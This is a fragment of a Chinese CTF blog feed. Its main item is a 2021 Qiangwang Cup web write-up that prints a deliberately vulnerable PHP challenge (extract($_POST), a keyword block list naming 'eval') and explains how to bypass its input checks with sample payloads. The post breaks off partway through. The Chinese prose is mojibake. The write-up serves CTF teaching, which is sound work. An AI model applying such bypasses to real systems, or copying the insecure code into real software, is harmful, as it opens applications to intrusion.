-u</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬fileä¸€ä¸‹  æ”¹ä¸‹åå­—  å¥½åŒºåˆ†<br><img src="/images/changanzhanyi/26.png" alt="image-20220120161811945"><br>zipå‹ç¼©åŒ…æ˜¯æœ‰å¯†ç çš„<br><img src="/images/changanzhanyi/27.png" alt="image-20220120162354291"><br>cmdä¸­è¿˜æœ‰ä¸€ä¸ªæ—¥è®°ï¼Œæå‡ºæ¥<img src="/images/changanzhanyi/28.png" alt="image-20220120162811234"><br>çœ‹åˆ°æ˜¯å¯†ç ï¼Œè§£å‹ä¸€ä¸‹ï¼Œé‡Œé¢æ˜¯åŠ å¯†çš„ä»£ç <br><img src="/images/changanzhanyi/29.png" alt="image-20220120162911649"><br><img src="/images/changanzhanyi/30.png" alt="image-20220120162945826"><br>æŠŠflagå›¾ç‰‡é‡Œçš„å†…å®¹æå‡ºæ¥ï¼Œè½¬æ¢ä¸€ä¸‹å°±å‡ºäº†</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>emmm å¤ªèœäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
            <tag> é•¿å®‰æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021å¼ºç½‘æ¯wp</title>
      <link href="/2021/06/24/2021%E5%BC%BA%E7%BD%91%E6%9D%AFwp/"/>
      <url>/2021/06/24/2021%E5%BC%BA%E7%BD%91%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="å¯»å®"><a href="#å¯»å®" class="headerlink" title="å¯»å®"></a>å¯»å®</h2><p>å¼€å±€ç»™äº†æºä»£ç ï¼Œé‚£åº”è¯¥æ˜¯è€ƒå¯Ÿphpçš„ç‰¹æ€§äº†ï¼Œæˆ‘ä»¬ä¸€ç‚¹ä¸€ç‚¹çš„çœ‹ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filter_word</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;KeY1lhv&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;num&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\,&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;0000000&#x27;</span>);</span><br><span class="line">        <span class="variable">$filter_phrase</span>= <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_word</span>).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="variable">$filter_phrase</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ppp</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$ppp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;nunber3&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$num1</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num2</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num3</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number3&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num4</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>]);</span><br><span class="line"><span class="variable">$num5</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>]);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num1</span>) &amp;&amp; is_numeric(<span class="variable">$num1</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;éæ•°å­—&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num1</span> &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ç¬¬ä¸€å±‚&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num2</span>) &amp;&amp; strlen(<span class="variable">$num2</span>) &lt;= <span class="number">4</span> &amp;&amp; intval(<span class="variable">$num2</span> + <span class="number">1</span>) &gt; <span class="number">500000</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ç¬¬äºŒå±‚&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num3</span>) &amp;&amp; <span class="string">&#x27;4bf21cd&#x27;</span> === substr(md5(<span class="variable">$num3</span>),<span class="number">0</span>,<span class="number">7</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ç¬¬ä¸‰å±‚&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(!(<span class="variable">$num4</span> &lt; <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4</span> == <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4</span> &lt;= <span class="number">0</span>)&amp;&amp;(strlen(<span class="variable">$num4</span>) &gt; <span class="number">6</span>)&amp;&amp;(strlen(<span class="variable">$num4</span>) &lt; <span class="number">8</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$num4</span>) )&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;ç¬¬å››å±‚&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$num5</span>)||(strlen(<span class="variable">$num5</span>)==<span class="number">0</span>)) <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                    <span class="variable">$b</span>=json_decode(@<span class="variable">$num5</span>);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$y</span> = <span class="variable">$b</span> === <span class="literal">NULL</span>)&#123;</span><br><span class="line">                                <span class="keyword">if</span>(<span class="variable">$y</span> === <span class="literal">true</span>)&#123;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="string">&quot;ç¬¬äº”å±‚&quot;</span>;</span><br><span class="line">                                    <span class="keyword">include</span> <span class="string">&#x27;KeY1lhv.php&#x27;</span>;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="variable">$KEY1</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no111&quot;</span>);&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filter_word</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;KeY1lhv&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;num&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\,&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;0000000&#x27;</span>);</span><br><span class="line">        <span class="variable">$filter_phrase</span>= <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_word</span>).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="variable">$filter_phrase</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¼€å¤´ç»™æˆ‘ä»¬è¿‡æ»¤äº†ä¸€äº›è¯ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ç»™çš„payloadä¸å¯ä»¥æœ‰è¿™äº›å•è¯ï¼Œè¿™é‡Œé¢æ„Ÿè§‰æœ€æœ‰ç”¨çš„å°±æ˜¯<code>000000</code> äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num1</span>) &amp;&amp; is_numeric(<span class="variable">$num1</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;éæ•°å­—&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num1</span> &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ç¬¬ä¸€å±‚&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç¬¬ä¸€å±‚æ˜¯å¿…é¡»è¦è¾“å…¥num1ï¼Œä¸”ä¸èƒ½æ˜¯æ•°å­—ï¼Œæ˜¯æ•°å­—çš„è¯ï¼Œå°±ç›´æ¥è¿›å…¥else<code>die</code>äº†ã€‚<br>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨<code>is_numeric</code>çš„ä¸€ä¸ªç¼ºé™·æ¥åˆ©ç”¨ï¼Œ<code>is_numeric</code>å‡½æ•°åˆ¤æ–­å˜é‡æ˜¯å¦ä¸ºæ•°å­—ï¼Œå¦‚æœæ˜¯æ•°å­—è¿”å›1ï¼Œå¦åˆ™è¿”å›0ï¼Œä½†å½“è¾“å…¥çš„å˜é‡æœ‰æ•°å­—å’Œå­—æ¯æ—¶ï¼Œå®ƒä¼šæˆªå–ç¬¬ä¸€ä¸ªå­—æ¯ä¹‹å‰çš„æ•°å­—ï¼Œä¸”è¿”å›0ï¼Œä¸¾ä¸ªæ —å­ï¼Œ<code>is_numeric(1234abc123)</code>ï¼Œè¿™é‡Œå®ƒä¼šå–1234ï¼Œè€Œåé¢çš„abcä»–å°±ä¸è¦äº†ã€‚é‚£è¿™æ ·çš„è¯æˆ‘ä»¬ç¬¬ä¸€å±‚ï¼Œè¿™é‡Œæˆ‘ä»¬åªéœ€<code>ppp[number1]=2222a</code>ï¼Œåªè¦æ¯”1024å¤§å°±å¯ä»¥äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num2</span>) &amp;&amp; strlen(<span class="variable">$num2</span>) &lt;= <span class="number">4</span> &amp;&amp; intval(<span class="variable">$num2</span> + <span class="number">1</span>) &gt; <span class="number">500000</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;ç¬¬äºŒå±‚&quot;</span>;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå±‚ï¼Œå¿…é¡»è¾“å…¥è¾“å…¥num2ä¸”é•¿åº¦å°äºæˆ–ç­‰äº4ä¸”è¿™ä¸ªæ•°åŠ ä¸€è¦å¤§äº500000<br>æ­£å¸¸å››ä½æ•°æœ€å¤§9999æ˜¾ç„¶ä¸å¤§äº500000<br>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨phpé‡Œçš„ç§‘å­¦è®¡æ•°æ³•ï¼Œ<code>1e3=1*10^3</code>ä¹Ÿå°±æ˜¯è¯´</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> å¼ºç½‘æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆå¤©ç½‘å®‰weekly,10-18å‘¨</title>
      <link href="/2020/09/10/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp10-18/"/>
      <url>/2020/09/10/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp10-18/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¬ä¹å‘¨-è¯•ä¸‹phpinfoå§"><a href="#ç¬¬ä¹å‘¨-è¯•ä¸‹phpinfoå§" class="headerlink" title="ç¬¬ä¹å‘¨ | è¯•ä¸‹phpinfoå§"></a>ç¬¬ä¹å‘¨ | è¯•ä¸‹phpinfoå§</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1WZ4y1H7gt">ç¬¬ä¹å‘¨ | è¯•ä¸‹phpinfoå§</a></p><h1 id="ç¬¬åå‘¨-è¯•è¯•åè®®å§"><a href="#ç¬¬åå‘¨-è¯•è¯•åè®®å§" class="headerlink" title="ç¬¬åå‘¨ | è¯•è¯•åè®®å§"></a>ç¬¬åå‘¨ | è¯•è¯•åè®®å§</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1Hz411v7c7">ç¬¬åå‘¨ | è¯•è¯•åè®®å§</a></p><hr><h1 id="ç¬¬åä¸€å‘¨-ç­¾åˆ°èˆ¬çš„åŒ…å«"><a href="#ç¬¬åä¸€å‘¨-ç­¾åˆ°èˆ¬çš„åŒ…å«" class="headerlink" title="ç¬¬åä¸€å‘¨ | ç­¾åˆ°èˆ¬çš„åŒ…å«"></a>ç¬¬åä¸€å‘¨ | ç­¾åˆ°èˆ¬çš„åŒ…å«</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV18v411q7mr">ç¬¬åä¸€å‘¨ | ç­¾åˆ°èˆ¬çš„åŒ…å«</a></p><hr><h1 id="ç¬¬åäºŒå‘¨-easy-LFI"><a href="#ç¬¬åäºŒå‘¨-easy-LFI" class="headerlink" title="ç¬¬åäºŒå‘¨ | easy LFI"></a>ç¬¬åäºŒå‘¨ | easy LFI</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1jD4y1U7Vy">ç¬¬åäºŒå‘¨ | easy LFI</a></p><hr><h1 id="ç¬¬åä¸‰å‘¨-simple-xxe"><a href="#ç¬¬åä¸‰å‘¨-simple-xxe" class="headerlink" title="ç¬¬åä¸‰å‘¨ | simple xxe"></a>ç¬¬åä¸‰å‘¨ | simple xxe</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1eT4y1j7ff/">ç¬¬åä¸‰å‘¨ | simple xxe</a></p><hr><h1 id="ç¬¬åå››å‘¨-blind-xxe"><a href="#ç¬¬åå››å‘¨-blind-xxe" class="headerlink" title="ç¬¬åå››å‘¨ | blind xxe"></a>ç¬¬åå››å‘¨ | blind xxe</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1nK411n7G9/">ç¬¬åå››å‘¨ | blind xxe</a></p><hr><h1 id="ç¬¬åäº”å‘¨-å›æ˜¾çš„SSRF"><a href="#ç¬¬åäº”å‘¨-å›æ˜¾çš„SSRF" class="headerlink" title="ç¬¬åäº”å‘¨ | å›æ˜¾çš„SSRF"></a>ç¬¬åäº”å‘¨ | å›æ˜¾çš„SSRF</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV18f4y197Lz/">ç¬¬åäº”å‘¨ | å›æ˜¾çš„SSRF</a></p><hr><h1 id="ç¬¬åå…­å‘¨-æœ‰ç‚¹å¦ç±»çš„SSRF"><a href="#ç¬¬åå…­å‘¨-æœ‰ç‚¹å¦ç±»çš„SSRF" class="headerlink" title="ç¬¬åå…­å‘¨ | æœ‰ç‚¹å¦ç±»çš„SSRF"></a>ç¬¬åå…­å‘¨ | æœ‰ç‚¹å¦ç±»çš„SSRF</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1g54y1U7Gj/">ç¬¬åå…­å‘¨ | æœ‰ç‚¹å¦ç±»çš„SSRF</a></p><hr><h1 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h1><p>æ‰“æ³¢å¹¿å‘Š,æˆ‘çš„bilibiliä¸»é¡µ<a href="https://space.bilibili.com/454748309">å…³æ³¨æˆ‘</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> åˆå¤©ç½‘å®‰ </tag>
            
            <tag> è§†é¢‘è®²è§£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆå¤©ç½‘å®‰weekly,1-9å‘¨</title>
      <link href="/2020/05/30/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp1-9/"/>
      <url>/2020/05/30/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp1-9/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="ç¬¬ä¸€å‘¨-ç¥å¥‡çš„ç£å¸¦"><a href="#ç¬¬ä¸€å‘¨-ç¥å¥‡çš„ç£å¸¦" class="headerlink" title="ç¬¬ä¸€å‘¨ | ç¥å¥‡çš„ç£å¸¦"></a>ç¬¬ä¸€å‘¨ | ç¥å¥‡çš„ç£å¸¦</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1DA411q7Go">ç¬¬ä¸€å‘¨ | ç¥å¥‡çš„ç£å¸¦</a></p><hr><h1 id="ç¬¬äºŒå‘¨-å°±å·®ä¸€æŠŠé’¥åŒ™"><a href="#ç¬¬äºŒå‘¨-å°±å·®ä¸€æŠŠé’¥åŒ™" class="headerlink" title="ç¬¬äºŒå‘¨ | å°±å·®ä¸€æŠŠé’¥åŒ™"></a>ç¬¬äºŒå‘¨ | å°±å·®ä¸€æŠŠé’¥åŒ™</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1np4y1X7L5">ç¬¬äºŒå‘¨ | å°±å·®ä¸€æŠŠé’¥åŒ™</a></p><hr><h1 id="ç¬¬ä¸‰å‘¨-è¿·äº†è·¯"><a href="#ç¬¬ä¸‰å‘¨-è¿·äº†è·¯" class="headerlink" title="ç¬¬ä¸‰å‘¨ | è¿·äº†è·¯"></a>ç¬¬ä¸‰å‘¨ | è¿·äº†è·¯</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV16K4y1t7jg">ç¬¬ä¸‰å‘¨ | è¿·äº†è·¯</a></p><hr><h1 id="ç¬¬å››å‘¨-Check-your-source-code"><a href="#ç¬¬å››å‘¨-Check-your-source-code" class="headerlink" title="ç¬¬å››å‘¨ | Check your source code"></a>ç¬¬å››å‘¨ | Check your source code</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1254y1D7Jy">ç¬¬å››å‘¨ | Check your source code</a></p><hr><h1 id="ç¬¬äº”å‘¨-Easy-upload"><a href="#ç¬¬äº”å‘¨-Easy-upload" class="headerlink" title="ç¬¬äº”å‘¨ | Easy upload"></a>ç¬¬äº”å‘¨ | Easy upload</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1KT4y1g7kr">ç¬¬äº”å‘¨ | Easy upload</a></p><hr><h1 id="ç¬¬å…­å‘¨-å¥—å¨ƒä¸€æ ·çš„ä¸Šä¼ "><a href="#ç¬¬å…­å‘¨-å¥—å¨ƒä¸€æ ·çš„ä¸Šä¼ " class="headerlink" title="ç¬¬å…­å‘¨ | å¥—å¨ƒä¸€æ ·çš„ä¸Šä¼ "></a>ç¬¬å…­å‘¨ | å¥—å¨ƒä¸€æ ·çš„ä¸Šä¼ </h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1mZ4y1p7vz">ç¬¬å…­å‘¨ | å¥—å¨ƒä¸€æ ·çš„ä¸Šä¼ </a></p><hr><h1 id="ç¬¬ä¸ƒå‘¨-å†è§ä¸Šä¼ "><a href="#ç¬¬ä¸ƒå‘¨-å†è§ä¸Šä¼ " class="headerlink" title="ç¬¬ä¸ƒå‘¨ | å†è§ä¸Šä¼ "></a>ç¬¬ä¸ƒå‘¨ | å†è§ä¸Šä¼ </h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1J5411x7Pt">ç¬¬ä¸ƒå‘¨ | å†è§ä¸Šä¼ </a></p><hr><h1 id="ç¬¬å…«å‘¨-éšæ„çš„ä¸Šä¼ "><a href="#ç¬¬å…«å‘¨-éšæ„çš„ä¸Šä¼ " class="headerlink" title="ç¬¬å…«å‘¨ | éšæ„çš„ä¸Šä¼ "></a>ç¬¬å…«å‘¨ | éšæ„çš„ä¸Šä¼ </h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV14K411n7Wx">ç¬¬å…«å‘¨ | éšæ„çš„ä¸Šä¼ </a></p><hr><h1 id="ç¬¬ä¹å‘¨-è¯•ä¸‹phpinfoå§"><a href="#ç¬¬ä¹å‘¨-è¯•ä¸‹phpinfoå§" class="headerlink" title="ç¬¬ä¹å‘¨ | è¯•ä¸‹phpinfoå§"></a>ç¬¬ä¹å‘¨ | è¯•ä¸‹phpinfoå§</h1><p>è§†é¢‘è®²è§£ğŸ‘‰<a href="https://www.bilibili.com/video/BV1WZ4y1H7gt">ç¬¬ä¹å‘¨ | è¯•ä¸‹phpinfoå§</a><br><br></p><h1 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h1><p>æ‰“æ³¢å¹¿å‘Š,æˆ‘çš„bilibiliä¸»é¡µ<a href="https://space.bilibili.com/454748309">å…³æ³¨æˆ‘</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> åˆå¤©ç½‘å®‰ </tag>
            
            <tag> è§†é¢‘è®²è§£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>welcome</title>
      <link href="/2020/05/08/hello/"/>
      <url>/2020/05/08/hello/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="nonono" data-whm="æŠ±æ­‰, è¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«æ ¡éªŒ, ä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹.">  <script id="hbeData" type="hbeData" data-hmacdigest="de5ffb3c355c37ef799db2811598b2e070118f1713db3c35b69817df54f1f8bd">7d8077bcea34d13a4778951ea2d2a1ccce0256bcc5d53f74bd6a858a945ec856276f2040ce3d91d145e95f65e63f536f564e07d3cc9ab9bb1fec22f262ad5a1e4fc99d0818f3a1cac7c2a6ea11b53f62975da05ba3343ad48b5b02b81e9efdecc44f4cfae33f5b10a48fc74460bc07491e960d4fafcb54b004ecfbeea566d704f0c8dbe63cbc78689d284f0b5ad3a587f242b222d0b826a89be3bd4b53523e4bc9784da2af2b9a4b4964e07bf508abff229ea78940ea4ab41dcb1bc2e390f9b90a3a4d5305b40a26e6a9bff33925686133c51d622f4a40bd556070284614620e2478b030f3e24a2f0fc1059e8599c5d6d0113e42c0625302624527d4c5bbe72d2047dfe2b04d78e73e5a0e581acdfd5e25fa6e38bd1cc24c265adf6d30fc068f6c4a4780a711c842d7a61d4a47ee8279eddfe9b090d6b98ab038348eeb86901f543edcd2263d3754d9ba2365ec8b1ada36f8cd6f88f8f0487f1f87c6cb1f2d436f513591ad5424d63cac089b792a884c4b773dc9738c626011ece68dbfe6a418dd7dada87289fa995942802846b8636490a62484c23728ffde04fc9f4475713dee7b1cfdf174e13d275c70ceeda5876c7392d6f064ec19ebaf13a894258a7d8577b9e722cfa10daef2e53f7918b0aeab</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">please input my name</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" 